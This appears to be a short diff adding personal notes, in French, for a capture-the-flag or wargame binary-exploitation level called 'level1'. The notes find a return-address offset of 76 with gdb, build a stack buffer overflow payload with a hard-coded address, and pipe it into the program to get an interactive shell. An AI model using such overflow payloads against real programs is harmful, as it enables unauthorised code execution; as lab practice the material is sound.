@@ -1,0 +1,15 @@
+python -c 'print "B"*80' > /tmp/payload 
+
+gdb level1
+
+r < /tmp/payload puis trouevr la bonne valeur pour injecter le payload 
+
+la bonne valeur est 76
+
+donc 
+
+python -c 'print "W"*76 + "\x44\x84\x04\x08"' > /tmp/payload 
+
+cat /tmp/payload - | ./level1
+
+
